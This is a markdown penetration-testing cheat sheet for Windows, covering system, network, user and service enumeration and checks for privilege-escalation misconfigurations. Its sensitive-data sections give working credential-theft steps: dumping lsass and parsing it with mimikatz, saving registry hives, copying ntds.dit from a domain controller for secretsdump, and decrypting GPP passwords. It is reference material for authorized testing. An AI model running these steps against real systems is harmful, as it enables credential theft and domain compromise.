
# Windows Initial Checks
## Basic Info
### Basic commands
```
hostname
systeminfo
systeminfo | findstr /b /C:"OS Name" /C"OS Version"
whoami
whoami /priv
whoami /groups
```
## Blind files
```
C:\Windows\System32\license.rtf
C:\Windows\System32\eula.txt
```
## Powershell
If the following command doesn't work, assume it's powershell 1.0.
```
powershell -Command "$PSVersionTable.PSVersion"
```
## AV Enumeration
```
sc query windefend
```
## Network Info
### Network Details
```
ipconfig /all  
route print  
arp -A  
netstat -ano
net stat
```
### Firewall  
```
netsh firewall show state  
netsh firewall show config  
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```
### Network capture
```
tcpdump -D
WinDump.exe
```
## Users and Groups
### Info about current user
```
echo %USERNAME%  
net user %USERNAME%
```
### Local
\*List all Local Users\*
```
net user 
```
\*List all Local Groups\*
```
net localgroup  
```
\*Check who is a member of the local group "Administrators"\*
```
net localgroup Administrators
```

### Domain
\*Users in a domain\*  
```
net user /domain  
```
\*Groups in a domain\*
```
net group /domain  
net group /domain &lt;Group Name&gt;  
```
# CVEs
## Patch Level  
```
wmic qfe get Caption, Description
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
## Applications
```
wmic product get name, version, vendor
```
##  Device Drivers and Kernel Modules
```
wmic logicaldisk get Caption

powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis
play Name’, ‘Start Mode’, Path

Get-WmiObject Win32\_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$\_.DeviceName -like "\*VMware\*"}
```
# Sensitive data
## Show Unmounted Disks
```
mountvol

mountvol c:\\test \\\?\\Volume{93131ba8-0000-0000-0000-100000000000}\
```
## Passwords reuse
### cmdkey
\*If there are entries, it means that we may able to runas certain user who stored his cred in windows\* 
```
cmdkey /list 
```
## Passwords in memory
Dump the lsass.exe process to a file using Windows built-in Task Manager with right-clicking “lsass.exe” then selecting “Create Dump File” (since Vista) or [Procdump](http://technet.microsoft.com/en-au/sysinternals/dd996900.aspx)(pre Vista) – alternatively, use some [powershell-fu](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)(see [carnal0wnage](http://carnal0wnage.attackresearch.com/2013/07/mimikatz-minidump-and-mimikatz-via-bat.html)blog post):
```
C:\> procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
```
Then dump the credentials offline using mimikatz and its minidump module:
```
C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
```
## Passwords in files
### SAM Files
```
%SYSTEMROOT%\\repair\\SAM  
%SYSTEMROOT%\\System32\\config\\RegBack\\SAM  
%SYSTEMROOT%\\System32\\config\\SAM  
%SYSTEMROOT%\\repair\\system  
%SYSTEMROOT%\\System32\\config\\SYSTEM  
%SYSTEMROOT%\\System32\\config\\RegBack\\system  
```

### Common files to check
```
c:\\sysprep.inf  
c:\\sysprep\\sysprep.xml  
c:\\unattend.xml  
%WINDIR%\\Panther\\Unattend\\Unattended.xml  
%WINDIR%\\Panther\\Unattended.xml
C:\Windows\system32\sysprep.inf 
C:\Windows\system32\sysprep\sysprep.xml

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s \*pass\*  

dir c:\\*vnc.ini /s /b  
dir c:\\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  
```
### Raw text search
```
findstr /si password *.xml *.ini *.txt
findstr /si pass/pwd *.ini  

dir /s \*pass\* == \*cred\* == \*vnc\* == *.config*  
findstr /spin "password" *.*  
findstr /spin "password" *.*  
```
## Passwords in Registry
### SAM 
#### Windows VM
```
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
```
#### Kali VM
```
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
### VNC  
```
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"  
reg query "HKCU\\Software\\TightVNC\\Server"  
```
### Windows autologin  
```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"  
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
```
### SNMP Paramters  
```
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"  
```
### Putty  
```
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"  
```
### Windows Data Protection API 
Dump passwords with [Netpass](http://www.nirsoft.net/utils/network_password_recovery.html):
```
netpass.exe
```
### IE/Outlook/MSN
Dump passwords with [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html):
```
pspv.exe
```
NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.
### Raw text search
```
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
REG QUERY HKLM /F "password" /t REG_SZ /S /K 
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
### Domain Controllers
#### GPP
Browse shares on the domain controller for passwords in Group Policy Preferences (GPP) that can be [decrypted](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html):
```
C:\> findstr /S cpassword \\dc1.securus.corp.com\sysvol\*.xml
\\192.168.122.55\sysvol\securus.corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml: ="" description="" cpassword="1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="1" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/>
C:\> ruby gppdecrypt.rb 1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs1q2w3e4r5t
```
####  AD database (Volume Shadow Copy)
##### Windows VM
This technique consists of retrieving the Active Directory database from the Directory Service running on the Domain Controller, also known as the “ntds.dit” file. The idea is to use the Volume Shadow Copy functionality to grab a copy of the “ntds.dit” file, which would be locked & protected from read access otherwise.
First, take note of the state of the Volume Shadow Copy service before going any further. If the Volume Shadow Copy service is not already running, which isn’t by default, then using ntdsutil or vssadmin as described below will start the service for you. Remember to set the service back to its original state once finished.

Then, confirm the location of the ntds.dit file from the “DSA Database file” parameter:
```
C:\> reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
```
At this stage, check the current size of the ntds.dit file and make sure there is at least twice as much free disk space. Once this is done, use the Windows built-in command-line tool [ntdsutil](http://technet.microsoft.com/en-us/library/cc753343.aspx) to create a snapshot of the active directory database.
```
C:\> ntdsutil
ntdsutil: snapshot
snapshot: activate instance NTDS
Active instance set to "NTDS".
snapshot: list all
No snapshots found.
// If there is a recent snapshot (ie. backups scheduled with Windows Server Backup), then consider using that instead of creating a new one.)
snapshot: create
Creating snapshot...
Snapshot set {ef026688-4c02-48b6-bc24-24df118eb7a2} generated successfully.
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1}
snapshot: mount 2
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} mounted as C:\$SNAP_201310241833_VOLUMEC$\
```
Now download the ntds.dit file from C:\\$SNAP\_201310241833\_VOLUMEC$\\Windows\\NTDS\ and also get a copy of the SYSTEM registry hive (eg. reg.exe save HKLM\\SYSTEM c:\\system.save).

Cleanup when done. Delete the copy of the system hive, and remove the snapshot:
```
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} C:\$SNAP_201310241833_VOLUMEC$\
snapshot: unmount 2
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} unmounted.
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1}
snapshot: delete 1
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} deleted.
snapshot: ^C
```
Restore the VSS service back to its original state (ie. stop the service if it wasn’t running before, disable the service if you had to enable it etc.).

Note that you could also use the Windows built-in tool vssadmin (as in this [howto](http://www.pentestgeek.com/2013/01/10/psexec_command-not-your-daddys-psexec/)), however vssadmin will not get you a “consistent” snapshot whereas ntdsutil is the correct tool to properly backup the ntds database. That said, ntdsutil on Windows 2003 can’t create snapshots so vssadmin should be used instead in this particular case.

If ntds.dit appears to be corrupted, use the built-in command-line tool [esentutl](http://technet.microsoft.com/en-us/library/hh875546.aspx) to try to repair it:
```
C:\> esentutl /p /o ntds.dit
```
##### Kali VM
Now it’s time to dump password hashes using [secretsdump](http://code.google.com/p/impacket/source/browse/trunk/examples/secretsdump.py):
```
    $ secretsdump.py -system system.save -ntds ntds.dit LOCAL
    Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies
    
    [*] Target system bootKey: 0x24f65609994cdbec01b8b0b61cf6a332
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] Pek found and decrypted: 0xca47b3a8b3477cec0a774bed669c3d9f
    [*] Reading and decrypting hashes from ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:a881324bad161293dedc71817988d944:::
    ...
```
You can also dump the password history with the -history option (since [r961](http://code.google.com/p/impacket/source/detail?r=961)).
####  AD database (AD Replication)
[Dumping Windows Credentials - Pure Security](https://pure.security/dumping-windows-credentials/)
# Misconfigurations 
## Global path
If any part of the SYSTEM %PATH% variable is writeable by Authenticated Users, privesc exists

Many applications don't use full path

If system32 is not first entry in path this is bad
```
reg query HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment
```
## Find Readable/Writable Files and Directories
```
accesschk.exe -uws "Everyone" "C:\\Program Files"

Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}
```

## Binaries That AutoElevate
\*\*If these are set we could run an msi to elevate privleges\*\*
```
reg query HKEY\_CURRENT\_USER\\Software\\Policies\\Microsoft\\Windows\\Installer

reg query HKEY\_LOCAL\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer
```
## Scheduled Tasks  
### Basic info
```
schtasks /query /fo LIST
```

### List only task names
```
schtasks /query /fo LIST 2>nul | findstr TaskName
```

### Verbose
```
schtasks /query /fo LIST /v  
```
### Parsing Verbose output
\*copy output and save in txt on kali machine\*  
```
cat schtask.txt | grep "SYSTEM\\|Task To Run" | grep -B 1 SYSTEM  
```

### Tasks on disk
```
dir c:\\windows\\tasks\  
dir c:\\windows\\system32\\tasks\  
```

### Info on specific task
```
schtasks /query /v /fo list /tn "\\System Maintenance"
```
## Privileges 

### AlwaysInstallElevated
\*If 64 bits use:  %SystemRoot%\\Sysnative\\reg.exe\*  
```
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated  
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated  
```
## Services
### Find all services running on the machine
```
    sc queryex type= service
```
### Find Non-Standard Services
\*Requires powershell\*
```
Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'} | findstr /v /i "Microsoft" | findstr /v /i "windows" | findstr /v /i "vmware"
```
### Unquoted Service Path
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\" | findstr /i /v """
```
### Start mode of service
```
wmic service where caption="Serviio" get name, caption, state, startmode
```
### Permissions for all services
```
accesschk.exe -uwcqv * /accepteula
```
### Weak Service Permissions
Find Services that can be modified
```
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Power Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
```
### Permission for service exe file
```
icacls "C:\\Program Files\\Serviio\\bin\\ServiioService.exe"
```
### wmic
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\\windows\\temp\\service_exes.txt

echo "" > c:\\windows\\temp\\exe_permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\\windows\\temp\\service\_exes.txt) do cmd.exe /c icacls "%a" >> c:\\windows\\temp\\exe\_permissions.txt
```
### Service Details
```
sc qc \\&lt;Service Name&gt;
```
### Service Permissions
```
accesschk.exe -ucqv \\&lt;Service Name&gt;  
```
### Output Service Info
```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY\_PATH\_NAME" >> path.txt
```
## File Permissions
\*Check permissions on file (Look for W or F tag) and substitute if possible\*
```
icacls scsiaccess.exe
```
## Registry Key permissions
```
subinacl /keyreg HKEY\_LOCAL\_MACHINE/software/microsoft
```

